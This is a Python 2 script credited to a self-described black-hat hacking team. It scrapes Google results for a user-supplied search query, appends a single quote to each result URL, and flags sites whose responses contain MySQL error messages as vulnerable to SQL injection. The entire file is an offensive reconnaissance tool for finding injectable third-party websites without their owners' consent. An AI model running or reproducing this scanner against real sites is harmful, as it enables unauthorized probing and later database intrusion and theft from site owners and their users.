__author__ = 'd3m0n'
__team__ = 'Bangladesh Black HAT Hackers'


import requests, urllib
from bs4 import BeautifulSoup

term = ""
search_key = ""
search_link = ""
nextPage = ""
counter = 0

class cw:
    blue = '\033[94m'
    endc = '\033[0m'


bugs = ["mysql_fetch_array()"]
bugs.append("error in your SQL syntax;")
bugs.append("mysql_result()")
bugs.append("mysql_num_rows()")
bugs.append("mysql_fetch_assoc()")
bugs.append("mysql_fetch_array()")


def Search():
    global search_link, term, counter, nextPage

    r = requests.get(search_link)

    s = BeautifulSoup(r.text)

    if r.text.find("did not match any") == -1:
        for link in s.find_all('a'):
            url = str(link.get('href'))
            if url.find("/url") != -1 and url.find("webcache") == -1:
                slink = urllib.unquote(url[url.find("http"):url.find("&")]).decode("UTF-8")
                try:
                    sr = requests.get(slink + "'")
                    for b in bugs:
                        if sr.text.find(b) != -1:
                            print(slink + cw.blue + " ^Vulnerable" + cw.endc)
                            break
                except:
                    continue
    else:
        print("Sorry, No Data found")
        term = "q"

    search_link = nextPage
    if term != "q":
        term = raw_input("More = Anykey | Quit = q : ")
        counter += 1


search_key = raw_input("Enter Query to Search : ")
while term != "q":
    search_link = "https://www.google.com/search?oe=utf8&ie=utf8&source=uds&start=" + int(
        10 * counter).__str__() + "&hl=en&q=" + search_key + "&gws_rd=ssl"
    Search()
